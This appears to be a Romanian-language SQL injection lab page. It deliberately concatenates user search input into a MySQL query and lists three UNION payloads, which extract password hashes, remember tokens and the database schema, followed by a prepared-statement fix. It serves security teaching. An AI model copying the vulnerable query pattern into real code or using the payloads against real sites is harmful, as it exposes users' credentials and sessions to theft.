<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <title>SQLi UNION — Vulnerabil</title>
    <style>
        body { font-family: sans-serif; max-width: 800px; margin: 40px auto; background: #f5f5f5; }
        .vuln-box { background:#fff3cd; border:2px solid #e74c3c; padding:15px; border-radius:5px; margin:15px 0; }
        .query-box { background:#2c3e50; color:#2ecc71; padding:15px; border-radius:5px; font-family:monospace; white-space:pre-wrap; word-break:break-all; margin:10px 0; }
        table { width:100%; border-collapse:collapse; background:#fff; margin:10px 0; }
        th { background:#2c3e50; color:#fff; padding:10px; }
        td { padding:8px; border-bottom:1px solid #ddd; }
        tr.injected { background:#ffeeba; }
        input[type=text] { width:100%; padding:8px; box-sizing:border-box; border:1px solid #ccc; border-radius:4px; margin:5px 0; }
        input[type=submit] { background:#e74c3c; color:#fff; padding:8px 16px; border:none; border-radius:4px; cursor:pointer; }
        .exploit-link { font-family:monospace; background:#fff; border:1px solid #ccc; padding:6px; border-radius:4px; display:block; margin:5px 0; font-size:.85em; word-break:break-all; }
    </style>
</head>
<body>
    <h1>&#128272; SQL Injection — UNION Data Extraction</h1>

    <div class="vuln-box">
        <strong>&#9888; PAGINĂ INTENȚIONAT VULNERABILĂ</strong><br>
        Căutarea concatenează direct input-ul în query → UNION injection extrage orice date din BD.
    </div>

<?php
require_once '../config/db.php';

$search   = $_GET['q']   ?? '';
$results  = [];
$vuln_sql = '';
$db_error = '';

if ($search !== '') {
    // ===== VULNERABIL: niciun prepared statement =====
    $vuln_sql = "SELECT username, faction, rank_title FROM users WHERE username LIKE '%" . $search . "%'";
    // =================================================

    try {
        $res = $mysqli->query($vuln_sql);
        if ($res) {
            $results = $res->fetch_all(MYSQLI_ASSOC);
        }
    } catch (mysqli_sql_exception $e) {
        $db_error = $e->getMessage();
    }
}
?>

    <form method="get">
        <label>Caută jucător:</label>
        <input type="text" name="q" value="<?= htmlspecialchars($search) ?>"
               placeholder="Încearcă un username sau un exploit UNION...">
        <input type="submit" value="Caută">
    </form>

    <?php if ($vuln_sql !== ''): ?>
    <h3>Query executat:</h3>
    <div class="query-box"><?= htmlspecialchars($vuln_sql) ?></div>
    <?php endif; ?>

    <?php if ($db_error !== ''): ?>
        <p style="color:red">Eroare BD: <?= htmlspecialchars($db_error) ?></p>
    <?php endif; ?>

    <?php if (!empty($results)): ?>
    <table>
        <tr><th>Coloana 1 (username)</th><th>Coloana 2 (faction)</th><th>Coloana 3 (rank)</th></tr>
        <?php foreach ($results as $row): ?>
        <tr <?= str_contains($search, 'UNION') ? 'class="injected"' : '' ?>>
            <td><?= htmlspecialchars($row['username'] ?? $row[0] ?? '') ?></td>
            <td><?= htmlspecialchars($row['faction']  ?? $row[1] ?? '') ?></td>
            <td><?= htmlspecialchars($row['rank_title'] ?? $row[2] ?? '') ?></td>
        </tr>
        <?php endforeach; ?>
    </table>
    <?php endif; ?>

    <h2>Exploit-uri de demonstrație</h2>
    <p>Copiază în câmpul de căutare:</p>

    <strong>Extrage toți utilizatorii + parole hash:</strong>
    <span class="exploit-link">' UNION SELECT username, password_hash, email FROM users -- </span>

    <strong>Extrage remember tokens (poate fi folosit pentru hijacking sesiune):</strong>
    <span class="exploit-link">' UNION SELECT username, remember_token, token_expiry FROM users -- </span>

    <strong>Listează tabelele din baza de date:</strong>
    <span class="exploit-link">' UNION SELECT table_name, table_schema, table_rows FROM information_schema.tables WHERE table_schema = 'quizztador' -- </span>

    <h2>Remediere</h2>
    <div class="query-box">// Prepared statement cu LIKE — parametrul este legat separat
$stmt = $pdo->prepare("SELECT username, faction, rank_title FROM users WHERE username LIKE ?");
$stmt->execute(['%' . $search . '%']);
$results = $stmt->fetchAll();</div>

    <br><a href="index.php">← Înapoi la index</a>
</body>
</html>
